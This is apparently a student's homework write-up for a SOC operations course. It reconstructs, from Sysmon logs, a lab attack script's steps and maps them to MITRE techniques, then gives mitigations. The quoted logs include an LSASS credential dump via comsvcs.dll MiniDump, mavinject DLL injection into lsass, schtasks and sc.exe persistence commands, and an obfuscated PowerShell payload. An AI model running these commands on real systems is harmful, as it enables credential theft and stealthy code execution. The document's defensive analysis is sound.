<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  TaiwanHolyHigh - SoC基礎維運 - HW2
  #


  Background
  #


Sysmon Event ID


  事件識別碼 1：處理程序建立
  #

處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 ProcessGUID 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 HashType 欄位中的演算法。


  事件識別碼 8：CreateRemoteThread
  #

CreateRemoteThread 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、StartModule 和 StartFunction。 請注意，系統會推斷 StartModule 和 StartFunction 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。


  事件識別碼 11：FileCreate
  #

建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。


  事件識別碼 13：RegistryEvent (值已設定)
  #

此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 DWORD 和 QWORD 的登錄值所寫入的值。



  Recon - Event Log呈現的攻擊順序
  #



Event ID: 8 → CreateRemoteThread
首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉

比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的reflective dll injection，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process
"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="TaiwanHolyHigh - SoC基礎維運 - HW2"><meta property="og:description" content="TaiwanHolyHigh - SoC基礎維運 - HW2 # Background # Sysmon Event ID 事件識別碼 1：處理程序建立 # 處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 ProcessGUID 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 HashType 欄位中的演算法。
事件識別碼 8：CreateRemoteThread # CreateRemoteThread 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、StartModule 和 StartFunction。 請注意，系統會推斷 StartModule 和 StartFunction 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。
事件識別碼 11：FileCreate # 建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。
事件識別碼 13：RegistryEvent (值已設定) # 此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 DWORD 和 QWORD 的登錄值所寫入的值。
Recon - Event Log呈現的攻擊順序 # Event ID: 8 → CreateRemoteThread 首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉 比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的reflective dll injection，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="TaiwanHolyHigh"><title>TaiwanHolyHigh - SoC基礎維運 - HW2 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>TaiwanHolyHigh - SoC基礎維運 - HW2</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a><ul><li><a href=#事件識別碼-1處理程序建立>事件識別碼 1：處理程序建立</a></li><li><a href=#事件識別碼-8createremotethread>事件識別碼 8：CreateRemoteThread</a></li><li><a href=#事件識別碼-11filecreate>事件識別碼 11：FileCreate</a></li><li><a href=#事件識別碼-13registryevent-值已設定>事件識別碼 13：RegistryEvent (值已設定)</a></li></ul></li><li><a href=#recon---event-log呈現的攻擊順序>Recon - Event Log呈現的攻擊順序</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#建議處理措施>建議處理措施</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=taiwanholyhigh---soc基礎維運---hw2>TaiwanHolyHigh - SoC基礎維運 - HW2
<a class=anchor href=#taiwanholyhigh---soc%e5%9f%ba%e7%a4%8e%e7%b6%ad%e9%81%8b---hw2>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://learn.microsoft.com/zh-tw/sysinternals/downloads/sysmon>Sysmon Event ID</a><blockquote><h3 id=事件識別碼-1處理程序建立>事件識別碼 1：處理程序建立
<a class=anchor href=#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-1%e8%99%95%e7%90%86%e7%a8%8b%e5%ba%8f%e5%bb%ba%e7%ab%8b>#</a></h3><p>處理程序建立事件會提供新建立處理程序的延伸資訊。 完整的命令列提供處理程序執行的內容。 <code>ProcessGUID</code> 欄位是跨定義域此處理程式的唯一值，可讓事件相互關聯更容易。 雜湊是檔案的完整雜湊，具有 <code>HashType</code> 欄位中的演算法。</p><hr><h3 id=事件識別碼-8createremotethread>事件識別碼 8：CreateRemoteThread
<a class=anchor href=#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-8createremotethread>#</a></h3><p><code>CreateRemoteThread</code> 事件會偵測處理程序何時在另一個處理程序中建立執行緒。 惡意程式碼會使用這項技術來插入程式碼，並隱藏在其他處理程序中。 事件表示來源和目標處理程序。 其會提供將在新執行緒中執行之程式碼的資訊：StartAddress、<code>StartModule</code> 和 <code>StartFunction</code>。 請注意，系統會推斷 <code>StartModule</code> 和 <code>StartFunction</code> 欄位，如果起始位址位於載入的模組或已知的匯出函式之外，這些欄位可能會是空的。</p><hr><h3 id=事件識別碼-11filecreate>事件識別碼 11：FileCreate
<a class=anchor href=#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-11filecreate>#</a></h3><p>建立或覆寫檔案時，系統會記錄檔案建立作業。 此事件適用於監視自動啟動位置，例如開機資料夾，以及暫存和下載目錄，這是初始感染期間惡意程式碼放置的常見位置。</p><hr><h3 id=事件識別碼-13registryevent-值已設定>事件識別碼 13：RegistryEvent (值已設定)
<a class=anchor href=#%e4%ba%8b%e4%bb%b6%e8%ad%98%e5%88%a5%e7%a2%bc-13registryevent-%e5%80%bc%e5%b7%b2%e8%a8%ad%e5%ae%9a>#</a></h3><p>此登錄事件類型會識別登錄值修改。 事件會記錄針對類型為 <code>DWORD</code> 和 <code>QWORD</code> 的登錄值所寫入的值。</p></blockquote></li></ul><h2 id=recon---event-log呈現的攻擊順序>Recon - Event Log呈現的攻擊順序
<a class=anchor href=#recon---event-log%e5%91%88%e7%8f%be%e7%9a%84%e6%94%bb%e6%93%8a%e9%a0%86%e5%ba%8f>#</a></h2><ol><li><p>Event ID: 8 → CreateRemoteThread
首先看到23/12/17 15:1024的時候，由==NT AUTHORITY\SYSTEM==發起的新的thread，從原本的Process(ID: 820)幫另外一個Process(ID: 7464)建立，誠如MSDN上的說明這應該是惡意程式為了不要被砍掉
<img src=https://hackmd.io/_uploads/rJjOTA-wa.png alt=圖片>
比較經典的案例是類似NTU CS助教 - @Ice1187 在Window Malware講到的<a href=https://attack.mitre.org/techniques/T1055/001/>reflective dll injection</a>，也就是Mitre紀載的==T1055.001==，其本質上就是利用CreateRemoteThread在一個正常的process開一個thread，然後做一些惡意的事情，這樣的話defender也不會把它砍掉，因為從外部看，就只是一個正常的process
<img src=https://hackmd.io/_uploads/Hy9wgyfPp.png alt=圖片></p></li><li><p>Kernel開Thread
接著為了成功開一個thread，就需要kernel base的dll做一些事情，包含:</p><pre tabindex=0><code>C:\Windows\SysWOW64\DllHost.exe&#34; /Processid:{776DBC8D-7347-478C-8D71-791E12EF49D8}
consent.exe 6504 376 000001EC1C876D30
</code></pre></li><li><p>啟動惡意script
從以下資訊可以知道該惡意script(auto-attack.bat)是由cmd執行起來的，另外執行這一串command的是explorer.exe代表他可能是執行在檔案總管執行或是在桌面執行</p><pre tabindex=0><code>ParentProcessId 3176 
ParentImage C:\Windows\explorer.exe 
ParentCommandLine C:\Windows\Explorer.EXE 
ParentUser W10C\Admin 
CommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ProcessId 7544 
</code></pre></li><li><p>選擇YN
從以下資訊可以知道choice.exe是由auto-attack.bat執行起來的，看了<a href=https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/choice>MSDN</a>的說明，知道其會有一個時間限制以及要選擇的提示</p><pre tabindex=0><code>ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin 
OriginalFileName choice.exe 
CommandLine choice /c YN
</code></pre></li><li><p>PowerShell - Get lsass.dmp
這條command就好玩了，接著auto-attack.bat又接續執行powershell，並且執行command如下，這一條command一開始看不太懂，隨便搜尋發現是一個經典的payload，主要是參考@3gstudent的文章<a href=https://3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95>《MiniDumpWriteDump via COM+ Services DLL》的利用測試</a>，一般來說我們都會想辦法用procdump之類的工具把lsass或是SYSTEM dump出來，但其實也可以用其他internal dll呼叫MiniDump的方式，把東西拿到手，範例的話可以參考<a href=https://gist.github.com/JohnLaTwC/3e7dd4cd8520467df179e93fb44a434e>comsvcs MiniDump examples</a></p><blockquote><p>&ldquo;C:\Windows\System32\rundll32.exe&rdquo; C:\Windows\System32\comsvcs.dll MiniDump &lt;PID> \Windows\Temp&lt;filename>.dmp full</p></blockquote><p>其實就和這一條payload有87趴像，中間的 ==((Get-Process lsass).Id)== 就是在抓lsass的PID，另外@3gstudent也有提到這個必須要是管理員權限才可以執行</p><pre tabindex=0><code>ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin 
OriginalFileName PowerShell.EXE 
CommandLine powershell.exe -NoProfile -Command &#34;rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full&#34;
ProcessId 8832
</code></pre><p>接著就是真的實際執行該條command後拿到lsass.dmp</p><pre tabindex=0><code>ParentProcessId 8832 
ParentImage C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
ParentCommandLine powershell.exe -NoProfile -Command &#34;rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full&#34; 
ParentUser W10C\Admin 
OriginalFileName RUNDLL32.EXE 
CommandLine &#34;C:\Windows\system32\rundll32.exe&#34; C:\Windows\System32\comsvcs.dll MiniDump 892 C:\Windows\Temp\lsass.dmp full 
</code></pre></li><li><p>Event ID: 11 - FileCreate</p><pre tabindex=0><code>TargetFilename C:\Windows\Temp\lsass.dmp 
CreationUtcTime 2023-12-17 07:10:29.916 
User W10C\Admin 
</code></pre></li><li><p>Timeout
從以下紀錄得知auto-attack.bat又繼續搞事，看了<a href=https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/timeout>MSDN</a>的說明，有點類似sleep的功能，雖然不知道加這行要幹嘛?</p><pre tabindex=0><code>ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin
ProcessId 6080 
OriginalFileName timeout.exe 
CommandLine TIMEOUT /T 3 
</code></pre></li><li><p>FileCreate - notepad.exe
這個我猜是直接embedded在auto-attack.bat裡面的一段notepad的bytecode，以防受害電腦沒有notepad.exe就可以直接創一個(?)不是很確定</p><pre tabindex=0><code>Image C:\Windows\System32\cmd.exe 
TargetFilename C:\Windows\Temp\notepad.exe
CreationUtcTime 2023-12-17 07:10:32.119 
User W10C\Admin 
</code></pre></li><li><p>Real Attack Payload
原本的payload很明顯就是base64的encode，不過實際解過發現參雜很多trash byte，如果把這些東西都拿掉就會很明朗，這也是一個常見的技巧，就是為了不要讓defender或是其他防毒知道payload pattern被已知database match出來，所以做了一些scramble，視情況有時候這種scramble的題目真的很討厭，不管是<a href=https://hackmd.io/@SBK6401/BJphpuJM6#Kill-4>BalsnCTF 2023 - Kill-4</a>或<a href=https://hackmd.io/@SBK6401/SyYU8hx62>PicoCTF - Some Assembly Required 3</a>都沒有解出來</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> decode <span style=color:#f92672>=</span> b64decode(payload<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> decode<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&amp; (gcm (</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>ie</span><span style=color:#e6db74>{0}</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74> -f </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>x</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>)) (&#34;Wr&#34;+&#34;it&#34;+&#34;e-H&#34;+&#34;ost </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>H&#34;+&#34;el&#34;+&#34;lo, fr&#34;+&#34;om P&#34;+&#34;ow&#34;+&#34;erS&#34;+&#34;h&#34;+&#34;ell!</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#34;)&#39;</span>
</span></span></code></pre></div><p>所以這一個正確的payload應該是 ==& (gcm (&lsquo;ie{0}&rsquo; -f &lsquo;x&rsquo;)) (&ldquo;Write-Host &lsquo;Hello, from PowerShell!&rsquo;&rdquo;)==</p><p>其實後來仔細找找就會發現<a href=https://redcanary.com/threat-detection-report/techniques/powershell/>redcanary的文章</a>中就有提到這一個obfuscated，就如同上面寫的，他就是<code>Invoke-Expression "Write-Host 'Hello, from PowerShell!'"</code>，如果實際丟到powershell的話就會在console印出<code>Hello, from PowerShell!</code>的字樣</p></li><li><p>Schtasks.exe
這個也是惡意軟體常見的操作，為了要避免重開機或是斷網等駭客不想看到的風險，會利用registry或是排程工具做到定期實質的操作，由下面的紀錄可以知道有是auto-attack.bat發起的process</p><pre tabindex=0><code>ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin 
OriginalFileName schtasks.exe 
CommandLine schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR &#34;cmd /c date /T &gt; C:\Windows\Temp\current_date.txt&#34; 
</code></pre><p>詳細的排程指令見<a href=https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/schtasks>MSDN</a>或是直接看<a href=https://chat.openai.com/share/17e2882e-e4f3-4e16-9bb2-80e3130bc3e3>chatgpt的說明</a>
接著就會看到在Windows存放Tasks的地方真的有一個叫做CMDTestTask被Create出來:</p><pre tabindex=0><code>ProcessId 1572 
Image C:\Windows\system32\svchost.exe 
TargetFilename C:\Windows\System32\Tasks\CMDTestTask 
CreationUtcTime 2023-12-17 07:10:35.212 
User NT AUTHORITY\SYSTEM 
</code></pre></li><li><p>Timeout → Query Task → Delete Task
從以下操作可以知道攻擊者應該只是想要知道這個功能有沒有辦法操作在victim中</p><pre tabindex=0><code>ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin 
OriginalFileName schtasks.exe 
CommandLine schtasks /Query /TN CMDTestTask 
↓
ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin 
OriginalFileName schtasks.exe 
CommandLine schtasks /Delete /TN CMDTestTask /F 
</code></pre></li><li><p>Mavinject
這個攻擊手法也是很有趣，詳細可以看<a href=https://attack.mitre.org/techniques/T1218/013/>Mitre的記錄-T1218-013</a></p><blockquote><p>攻擊者可能會濫用mavinject.exe 來代理惡意程式碼的執行。Mavinject.exe 是Microsoft 應用程式虛擬化注入器，它是一種Windows 實用程序，可以作為Microsoft 應用程式虛擬化(App-V) 的一部分將程式碼注入到外部進程中。
攻擊者可能會濫用 mavinject.exe 將惡意 DLL 注入正在運行的進程（即動態連結程式庫注入），從而允許執行任意程式碼（例如 <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>）。 由於 mavinject.exe 可能經過 Microsoft 數位簽名，因此透過此方法代理執行可能會逃避安全性產品的偵測，因為執行被隱藏在合法進程下。
除了動態連結程式庫注入之外，Mavinject.exe 還可以被濫用透過其 /HMODULE 命令列參數（例如 <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>）執行導入描述符注入。 此指令會將由指定 DLL 組成的導入表條目注入到模組的給定基底位址處。</p></blockquote><pre tabindex=0><code>ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin 
OriginalFileName PowerShell.EXE 
CommandLine powershell.exe -NoProfile -Command &#34;mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll&#34; 
ProcessId 11488
</code></pre><p>從以上payload發現和Mitre上的記錄一模一樣，把lsass的process inject到vbscript.dll這種windows高度信任的檔案</p><pre tabindex=0><code>ParentProcessId 11488 
ParentImage C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
ParentCommandLine powershell.exe -NoProfile -Command &#34;mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll&#34; 
ParentUser W10C\Admin 
OriginalFileName mavinject64.exe 
CommandLine &#34;C:\Windows\system32\mavinject.exe&#34; 892 /INJECTRUNNING C:\Windows\System32\vbscript.dll 
</code></pre><p>所以下一個log就實際執行上一個command</p></li><li><p>Timeout → Powershell Hello Payload → Timeout → CMD Hello Payload → Timeout
接著auto-attack.bat又執行powershell的下列command:</p><pre tabindex=0><code>ParentProcessId 7544 
ParentImage C:\Windows\System32\cmd.exe 
ParentCommandLine &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34;  
ParentUser W10C\Admin 
OriginalFileName PowerShell.EXE 
CommandLine powershell.exe -NoProfile -Command &#34;(ps lsass).Modules | Where-Object { $_.ModuleName -eq &#39;vbscript.dll&#39; }&#34; 
</code></pre><p>接著重複執行第9步的powershell payload:</p><pre tabindex=0><code>ParentProcessId: 7544
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34; 
ParentUser: W10C\Admin
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
ProcessId: 13276
</code></pre><p>再執行一次CMD版本的Hello Payload:</p><pre tabindex=0><code>ParentProcessId: 7544
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34; 
ParentUser: W10C\Admin
OriginalFileName: Cmd.Exe
CommandLine: cmd  /c echo Hello, from CMD!  
</code></pre></li><li><p>Open Notepad.exe → Timeout
這一段payload就只是在啟動Notepad.exe這個application而已</p><pre tabindex=0><code>ParentProcessId: 7544
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34; 
ParentUser: W10C\Admin
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe  pcwutl.dll,LaunchApplication C:\Windows\System32\notepad.exe
</code></pre></li><li><p>Open Service Control Manager → Timeout → Query Registry → Delete Registry
根據<a href=https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/sc-create>MSDN</a>的說明，==sc.exe==是一個在資料庫中建立服務的子機碼和專案的工具，而記錄如下:</p><pre tabindex=0><code>ParentProcessId: 7544
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: &#34;C:\Windows\System32\cmd.exe&#34; /C &#34;C:\Users\Admin\Desktop\auto-attack.bat&#34; 
ParentUser: W10C\Admin
OriginalFileName: sc.exe
CommandLine: sc  create CMDTestService type=own binPath=&#34;cmd /c date /T &gt; C:\Windows\Temp\current_date.txt&#34;
</code></pre><p>總的來說，目的是創建一個名為 &ldquo;CMDTestService&rdquo; 的服務，該服務指定在其本身process中執行的服務，且不會與其他服務共用可執行檔，並且它的主要功能是運行一個命令，將當前日期寫入到指定的文本文件中，也的確在Event ID: 13中看到創了一個registry event在==HKLM\System\CurrentControlSet\Services\CMDTestService\Start==
不過接著就像上面看到排程的操作一樣，他進行了該Event的query，當query到的時候就是確定惡意程式可以透過registry進行操作，並且直接把該event刪除，詳細紀錄如下:</p><pre tabindex=0><code>OriginalFileName: sc.exe
CommandLine: sc  query CMDTestService
↓
OriginalFileName: sc.exe
CommandLine: sc  delete CMDTestService
</code></pre></li></ol><h2 id=conclusion>Conclusion
<a class=anchor href=#conclusion>#</a></h2><p>總結以上的操作，會發現auto-attack.bat在做的事情只有幾件事:</p><ol><li>(攻擊1)利用comsvcs.dll搭配MiniDump把lsass拿到手</li><li>(攻擊2)利用notepad.exe執行base64並且obfuscate過後的payload，如果把該payload改成更進階或更惡意的手法，就會造成更大的損失</li><li>(攻擊3)利用Schtasks.exe這樣內建的排程工具，可以做到定期執行惡意的動作(Persistent)，諸如定期回報給C2 server以便更好掌握手中的肉機，後續嘗試DDoS攻擊可以用到，詳細可以看<a href=https://attack.mitre.org/techniques/T1053/>Mitre T1053</a>有更多的手法可以參考</li><li>(攻擊4)利用mavinject.exe把lsass process注入到正常執行且可信度高的process，如果我們是注入惡意的process，是不是就可以達到更大的受害範圍?詳細可以參考<a href=https://attack.mitre.org/techniques/T1218/013/>Mitre T1218-013</a></li><li>(攻擊5)有點像攻擊2的另一個版本，其實是利用更強大的powershell進行一樣的攻擊，payload的靈活度也大大提升</li><li>(攻擊6)利用sc.exe設定registry，可以先看看<a href=https://attack.mitre.org/techniques/T1569/002/>Mitre T1569-002</a>的說明，攻擊者可以利用這類型的手法和工具，諸如PsExec, sc.exe等，達到遠端執行command的功能</li></ol><h2 id=建議處理措施>建議處理措施
<a class=anchor href=#%e5%bb%ba%e8%ad%b0%e8%99%95%e7%90%86%e6%8e%aa%e6%96%bd>#</a></h2><ul><li>根據Mitre針對T1055(Reflective DLL Injection)的mitigations就是針對該行為的patter進行endpoint的偵測(prevention)</li><li>至於針對T1218-013(Mavinject)的mitigations有兩種，<ul><li>其一是把該功能disable或remove；</li><li>其二是做好execution prevention，避免被濫用</li></ul></li><li>針對T1053(Schtasks.exe)的mitigation，有四種，<ul><li>其一是稽核，PowerSploit 框架等工具包包含 PowerUp 模組，可用於探索系統排程任務中的權限弱點，可用於提升權限；</li><li>其二是做好OS Configuration的身分認證操作，配置計劃任務的設定以強制任務在經過身份驗證的帳戶的上下文中運行，而不是允許它們作為SYSTEM運行。關聯的登錄項目位於 HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl。可透過 GPO 設定此設定：電腦設定 > [策略] > Windows 設定 > 安全性設定 > 本機原則 > 安全性選項： 網域控制站：允許伺服器操作員排程任務，設定為停用；</li><li>其三，新增配置「增加排程優先權」選項以僅允許管理員群組調度優先權進程的權限。 這可以透過 GPO 進行設定：電腦設定 > [策略] > Windows 設定 > 安全性設定 > 本機原則 > 使用者權限指派：增加計畫優先權；</li><li>其四，限制使用者帳戶的權限並修復權限升級向量，以便只有授權管理員才能在遠端系統上建立排程任務。</li></ul></li><li>針對T1569(sc.exe)的mitigation有三種<ul><li>在endpoint偵測他的behavior以便做到prevention</li><li>確保帳號的權限不允許具有較低權限等級的使用者建立以較高權限等級執行的服務或與之互動</li><li>確保具有較低權限等級的使用者無法取代或修改高權限等級的服務二進位。</li></ul></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a><ul><li><a href=#事件識別碼-1處理程序建立>事件識別碼 1：處理程序建立</a></li><li><a 